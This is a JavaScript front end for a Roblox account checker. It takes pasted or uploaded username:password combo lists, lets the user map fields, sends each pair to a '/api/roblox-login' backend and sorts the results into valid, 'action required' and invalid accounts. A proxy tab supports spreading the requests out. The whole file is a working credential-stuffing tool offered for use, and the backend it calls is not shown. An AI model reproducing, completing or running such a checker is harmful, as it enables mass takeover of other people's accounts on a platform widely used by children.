const app = document.getElementById('app');
let userName = localStorage.getItem('username') || null;

let format = { site: -1, username: -1, password: -1 };
let parsedLines = [];
let valid = [], invalid = [], actionRequired = [];
let checkingCount = 0;

let currentTab = 'accounts';
let debugMode = false;
let savedProxies = [];
let debugLog = [];

function switchTab(tab) {
  currentTab = tab;
  renderTab();
}

function renderTab() {
  const tabContent = document.getElementById('tabContent');
  if (!tabContent) return;

  switch (currentTab) {
    case 'accounts':
      renderMainScreen();
      break;

    case 'proxies':
      tabContent.innerHTML = `
        <h2>Proxy Settings</h2>
        <textarea id="proxyInput" placeholder="Paste one proxy per line..." style="width: 100%; height: 150px; font-family: monospace;"></textarea>
        <button onclick="saveProxies()" style="margin-top: 10px; padding: 8px 16px; cursor: pointer;">Save Proxies</button>
        <h3>Saved Proxies:</h3>
        <pre style="background:#f5f5f5; padding: 10px; max-height: 200px; overflow-y:auto;">${savedProxies.length ? savedProxies.join('\n') : 'None'}</pre>
      `;
      break;

    case 'debug':
      tabContent.innerHTML = `
        <h2>Debug Mode</h2>
        <label style="display:flex; align-items:center; gap:8px;">
          <input type="checkbox" onchange="toggleDebug(this)" ${debugMode ? 'checked' : ''} />
          Enable Debug Output
        </label>
        <pre id="debugOutput" style="background:#111; color:#0f0; padding: 10px; height: 200px; overflow-y: auto; margin-top: 10px; font-family: monospace;">${debugLog.join('\n')}</pre>
      `;
      break;

    default:
      tabContent.textContent = 'Unknown tab.';
  }
}

function toggleDebug(checkbox) {
  debugMode = checkbox.checked;
  if (!debugMode) {
    debugLog = [];
    const debugOutput = document.getElementById('debugOutput');
    if (debugOutput) debugOutput.textContent = '';
  }
}

function saveProxies() {
  const input = document.getElementById('proxyInput').value.trim();
  savedProxies = input.split('\n').map(line => line.trim()).filter(line => line.length > 0);
  alert('Proxies saved!');
  renderTab();
}

function logout() {
  localStorage.removeItem('username');
  location.reload();
}

function logDebug(message) {
  if (debugMode) {
    debugLog.push(message);
    const debugOutput = document.getElementById('debugOutput');
    if (debugOutput) {
      debugOutput.textContent = debugLog.join('\n');
      debugOutput.scrollTop = debugOutput.scrollHeight;
    }
  }
}

function renderNameScreen() {
  app.innerHTML = `
    <div class="name-screen" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; font-family: Arial, sans-serif;">
      <h1>Enter your name...</h1>
      <input id="nameInput" placeholder="Enter your name..." autocomplete="off" style="padding:10px; font-size:1rem; margin-bottom:10px; width: 250px;"/>
      <button id="continueBtn" style="padding:8px 16px; cursor:pointer;">Continue</button>
    </div>
  `;
  const input = document.getElementById('nameInput');
  const btn = document.getElementById('continueBtn');

  btn.onclick = saveName;
  input.addEventListener('keydown', e => {
    if (e.key === 'Enter') saveName();
  });
}

function saveName() {
  const name = document.getElementById('nameInput').value.trim();
  if (!name) {
    alert('Please enter a valid name.');
    return;
  }
  localStorage.setItem('username', name);
  userName = name;
  renderMainScreen();
}

function renderMainScreen() {
  app.innerHTML = `
    <div class="main-screen" style="max-width: 800px; margin: 2rem auto; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center;">
      <h1>Hello, <span class="green">${userName}</span></h1>
      <textarea id="credInput" rows="8" placeholder="Paste your credentials here..." style="width: 100%; max-width: 600px; font-family: monospace; padding: 10px; margin-bottom: 1rem;"></textarea>
      <input type="file" id="fileInput" style="margin-bottom: 1rem;"/>
      <button id="previewBtn" style="padding: 8px 16px; cursor: pointer; margin-bottom: 1rem;">Preview & Assign Format</button>

      <div id="previewArea" style="width: 100%; max-width: 600px; text-align: left;"></div>

      <div id="siteSelect" class="hidden" style="width: 100%; max-width: 600px; margin-top: 1rem; text-align: center;">
        <h2>Site: <img src="https://www.roblox.com/favicon.ico" alt="Roblox" style="width:20px; vertical-align: middle;"> Roblox</h2>
        <button id="validateBtn" style="padding: 8px 16px; cursor: pointer;">Validate Credentials</button>
        <div id="progress" style="margin-top: 10px;"></div>
      </div>

      <div id="results" style="width: 100%; max-width: 600px; margin-top: 2rem;"></div>
    </div>
  `;

  document.getElementById('fileInput').addEventListener('change', previewData);
  document.getElementById('previewBtn').onclick = previewData;
  document.getElementById('validateBtn').onclick = validateCredentials;
}

function previewData() {
  let input = document.getElementById('credInput').value.trim();
  const file = document.getElementById('fileInput').files[0];

  if (file) {
    const reader = new FileReader();
    reader.onload = e => {
      input = e.target.result;
      processPreview(input);
    };
    reader.readAsText(file);
  } else {
    processPreview(input);
  }
}

function processPreview(data) {
  parsedLines = data.split('\n').filter(line => line.includes(':') || line.includes(',') || line.includes('|')).map(line => line.trim());
  if (parsedLines.length === 0) {
    alert('No valid lines found.');
    return;
  }

  const delimiter = parsedLines[0].includes(':') ? ':' : parsedLines[0].includes(',') ? ',' : '|';

  const previewLines = parsedLines.slice(0, 3);
  let previewHTML = `<h2>Assign Format:</h2><div style="display:flex; gap:10px;">`;

  const tokens = previewLines[0].split(delimiter);

  tokens.forEach((token, idx) => {
    previewHTML += `
      <div style="flex:1;">
        <div style="background:#f0f0f0; padding: 6px; border-radius: 4px; font-family: monospace;">${token}</div>
        <select onchange="setFormat(${idx}, this.value)" style="width: 100%; margin-top: 4px; padding: 4px;">
          <option value="">None</option>
          <option value="username">Username</option>
          <option value="password">Password</option>
          <option value="site">Site</option>
        </select>
      </div>
    `;
  });
  previewHTML += `</div>`;

  previewHTML += `<pre style="margin-top:1rem; font-family: monospace;">${previewLines.join('\n')}</pre>`;

  document.getElementById('previewArea').innerHTML = previewHTML;
  document.getElementById('siteSelect').classList.remove('hidden');
}

function setFormat(index, role) {
  // Ensure no duplicate assignments
  for (const key in format) {
    if (format[key] === index) format[key] = -1;
  }
  if (role) format[role] = index;
}

async function validateCredentials() {
  if (format.username === -1 || format.password === -1) {
    alert('Please assign Username and Password fields.');
    return;
  }

  valid = [];
  invalid = [];
  actionRequired = [];
  checkingCount = 0;

  const resultsDiv = document.getElementById('results');
  const progressDiv = document.getElementById('progress');
  resultsDiv.innerHTML = '';
  progressDiv.innerText = `Checked: 0 / ${parsedLines.length}`;

  for (const line of parsedLines) {
    const delimiter = line.includes(':') ? ':' : line.includes(',') ? ',' : '|';
    const parts = line.split(delimiter);
    const username = parts[format.username]?.trim();
    const password = parts[format.password]?.trim();

    if (!username || !password) continue;

    logDebug(`Checking ${username}...`);

    const result = await checkRobloxCredentialsAPI(username, password);

    checkingCount++;
    progressDiv.innerText = `Checked: ${checkingCount} / ${parsedLines.length}`;

    if (result.success) {
      valid.push(result);
    } else if (result.actionRequired) {
      actionRequired.push({ username, password, reason: result.reason || 'Action Required' });
    } else {
      invalid.push({ username, password });
    }
    renderResults(valid, invalid, actionRequired);
  }
}

async function checkRobloxCredentialsAPI(username, password) {
  try {
    const response = await fetch('/api/roblox-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
    });
    const data = await response.json();
    data.username = username;
    data.password = password;
    return data;
  } catch (err) {
    logDebug(`Error checking ${username}: ${err.message}`);
    return { success: false, error: err.message };
  }
}

function renderResults(validArr, invalidArr, actionArr) {
  let html = '';

  html += `<h2 style="color:green;">✅ Valid Accounts</h2>`;
  html += validArr.length === 0 ? `<p>No valid accounts yet.</p>` : validArr.map(user => resultCard(user, 'green')).join('');

  html += `<h2 style="color:orange;">⚠️ Action Required Accounts</h2>`;
  html += actionArr.length === 0 ? `<p>No accounts requiring action yet.</p>` : actionArr.map(user => resultCard(user, 'orange')).join('');

  html += `<h2 style="color:red;">❌ Invalid Accounts</h2>`;
  html += invalidArr.length === 0 ? `<p>No invalid accounts yet.</p>` : invalidArr.map(user => resultCard(user, 'red')).join('');

  document.getElementById('results').innerHTML = html;
}

function resultCard(user, color) {
  return `
    <div style="border: 1px solid ${color}; padding: 10px; margin-bottom: 10px; border-radius: 6px; font-family: monospace;">
      <strong>${user.username}</strong> : ${user.password}
      ${user.reason ? `<div style="color: ${color}; font-style: italic;">${user.reason}</div>` : ''}
    </div>
  `;
}

function init() {
  if (!userName) {
    renderNameScreen();
  } else {
    renderMainScreen();
  }
  renderTab();
}

window.switchTab = switchTab;
window.setFormat = setFormat;
window.toggleDebug = toggleDebug;
window.saveProxies = saveProxies;
window.logout = logout;

init();
